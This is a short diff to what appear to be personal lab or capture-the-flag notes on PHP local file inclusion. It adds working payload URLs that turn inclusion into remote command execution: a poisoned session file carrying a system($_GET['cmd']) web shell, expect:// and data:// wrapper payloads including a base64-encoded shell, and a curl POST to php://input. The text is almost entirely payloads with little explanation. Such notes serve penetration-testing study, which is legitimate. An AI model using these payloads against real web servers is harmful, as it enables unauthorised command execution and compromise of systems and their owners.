@@ -31,6 +31,21 @@ Poison the Cookie
 * Prime the website for code injection
 > http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?>
 
+* Inject code where id is. Ie cmd=ifconfig
+> http://46.101.91.21:32484/index.php?language=/var/lib/php/sessions/sess_nvc45a8h12hmm2l2bc1ug3bage&cmd=id
+
+ * Other ways to execude remote code - There is 3
+   * Execute code where id is (1)
+   > http://46.101.91.21:32484/index.php?language=expect://id
+   * Get the base64 digit (2)
+   > http://46.101.91.21:32484/index.php?language=expect://echo '<?php system($_GET['cmd']); ?>' | base64
+   * Execute command (2)
+   > http://46.101.91.21:32484/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
+   * Execute code via curl, code goes where id is (3)
+   > curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid
+
+
+
 
 
 
